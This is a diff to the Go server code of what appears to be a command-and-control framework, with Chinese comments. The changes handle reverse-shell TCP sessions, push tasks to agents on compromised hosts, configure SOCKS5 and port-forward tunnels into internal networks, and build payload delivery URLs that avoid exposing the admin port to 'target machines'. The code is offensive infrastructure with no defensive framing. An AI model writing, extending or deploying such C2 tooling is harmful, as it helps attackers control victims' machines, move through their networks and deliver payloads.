@@ -131,6 +131,20 @@ func handleListSessions(w http.ResponseWriter, r *http.Request, user tokenInfo) 
 
 func handleKillSession(w http.ResponseWriter, r *http.Request, user tokenInfo) {
 	sessionID := r.PathValue("session_id")
+	// 如果是 Shell 类型会话，同时关闭 raw TCP 连接
+	client, _ := queryOne("SELECT client_id, client_type FROM clients WHERE session_id=?", sessionID)
+	if client != nil && getString(client, "client_type", "") == "shell" {
+		cid := getString(client, "client_id", "")
+		shellConnsMu.Lock()
+		if sess, ok := shellConns[cid]; ok {
+			sess.mu.Lock()
+			sess.closed = true
+			sess.conn.Close()
+			sess.mu.Unlock()
+			delete(shellConns, cid)
+		}
+		shellConnsMu.Unlock()
+	}
 	dbExec("UPDATE clients SET session_state='dead' WHERE session_id=?", sessionID)
 	addLog("client", fmt.Sprintf("Kill Session: %s", sessionID), "", user.UserID, getRequestIP(r))
 	broadcastClientUpdate()
@@ -225,6 +239,25 @@ func handleSendTask(w http.ResponseWriter, r *http.Request, user tokenInfo) {
 		tid, _ := dbExec("INSERT INTO tasks (client_id, task_type, task_data, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
 			cid, data.TaskType, string(taskDataJSON), nowLocal())
 		taskIDs = append(taskIDs, tid)
+
+		// WS/TCP 长连接客户端: 主动推送任务，无需等待客户端 pull
+		// 推送格式与 pull 响应一致: {"tasks": [{"id":..., "task_type":..., "task_data":...}]}
+		// 推送后任务状态保持 pending，客户端执行回传 result 时再更新
+		taskDataInterface := interface{}(map[string]interface{}{})
+		if taskDataJSON != nil {
+			var td interface{}
+			if json.Unmarshal(taskDataJSON, &td) == nil {
+				taskDataInterface = td
+			}
+		}
+		pushData := map[string]interface{}{
+			"id":        tid,
+			"task_type": data.TaskType,
+			"task_data": taskDataInterface,
+		}
+		if pushTaskToAgent(cid, pushData) {
+			addLog("task", fmt.Sprintf("推送任务到长连接客户端: %s (task_id=%d)", cid, tid), "", user.UserID, getRequestIP(r))
+		}
 	}
 
 	addLog("task", fmt.Sprintf("下发任务: %s, 目标数量: %d", data.TaskType, len(data.ClientIDs)), "", user.UserID, getRequestIP(r))
@@ -366,9 +399,11 @@ func handleUpdateSettings(w http.ResponseWriter, r *http.Request, user tokenInfo
 		l, _ := listenRaw.(map[string]interface{})
 		// 端口字段: 前端 key -> (DB key, 中文标签) —— 仅数据库存储的端口（web 端口来自 config.json 不在此列）
 		portFields := map[string][2]string{
-			"client_listen_port":    {"client_listen_port", "客户端监听"},
-			"tunnel_port_forward":   {"tunnel_port_forward", "内网穿透-端口转发"},
-			"tunnel_socks5_port":    {"tunnel_socks5_port", "内网穿透-SOCKS5"},
+			"client_listen_port":     {"client_listen_port", "Agent回连"},
+			"agent_tcp_port":         {"agent_tcp_port", "Agent TCP"},
+			"shell_listen_port":      {"shell_listen_port", "Shell TCP"},
+			"tunnel_port_forward":    {"tunnel_port_forward", "内网穿透-端口转发"},
+			"tunnel_socks5_port":     {"tunnel_socks5_port", "内网穿透-SOCKS5"},
 			"tunnel_http_proxy_port": {"tunnel_http_proxy_port", "内网穿透-HTTP代理"},
 		}
 		// 收集本次提交的端口，并与数据库已有值合并做全局唯一性校验
@@ -400,6 +435,9 @@ func handleUpdateSettings(w http.ResponseWriter, r *http.Request, user tokenInfo
 		listenKeyMap := map[string]string{
 			"callback_host":          "callback_host",
 			"client_listen_port":     "client_listen_port",
+			"agent_protocol":         "agent_protocol",
+			"agent_tcp_port":         "agent_tcp_port",
+			"shell_listen_port":      "shell_listen_port",
 			"tunnel_port_forward":    "tunnel_port_forward",
 			"tunnel_socks5_port":     "tunnel_socks5_port",
 			"tunnel_http_proxy_port": "tunnel_http_proxy_port",
@@ -416,6 +454,13 @@ func handleUpdateSettings(w http.ResponseWriter, r *http.Request, user tokenInfo
 		// callback_host 修改需要重新刷新缓存
 		if _, exists := l["callback_host"]; exists {
 			updatedKeys = append(updatedKeys, "callback_host")
+		}
+		// 端口/协议修改需要重启服务才生效
+		for _, k := range []string{"client_listen_port", "agent_protocol", "agent_tcp_port", "shell_listen_port"} {
+			if _, exists := l[k]; exists {
+				restartRequired = true
+				break
+			}
 		}
 	}
 
@@ -600,7 +645,9 @@ func handleListPayloads(w http.ResponseWriter, r *http.Request, user tokenInfo) 
 		payloads = []map[string]interface{}{}
 	}
 	// 补充 delivery_url 和 download_filename 字段，供前端直接使用
-	c2Server := fmt.Sprintf("%s://%s:%s", getListenProtocol(), getCallbackHost(), getListenPort())
+	// delivery_url 用 agent 专用端口（client_listen_port），与 payload 回连端口一致，
+	// 避免把 web 管理端口暴露给目标机器
+	c2Server := fmt.Sprintf("%s://%s:%s", getListenProtocol(), getCallbackHost(), getClientListenPort())
 	for _, p := range payloads {
 		token := getString(p, "delivery_token", "")
 		if token != "" {
@@ -774,6 +821,8 @@ func handleReloadConfig(w http.ResponseWriter, r *http.Request, user tokenInfo) 
 		jsonError(w, "config.json 加载失败: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
+	// 刷新 Origin 白名单缓存（config.json 重新加载后生效）
+	refreshAllowedOrigins()
 	addLog("settings", fmt.Sprintf("重新加载 config.json: web=%s:%d (%s)", cfg.Web.Host, cfg.Web.Port, strings.ToUpper(cfg.Web.Protocol)), "", user.UserID, getRequestIP(r))
 	jsonOK(w, map[string]interface{}{
 		"success":           true,
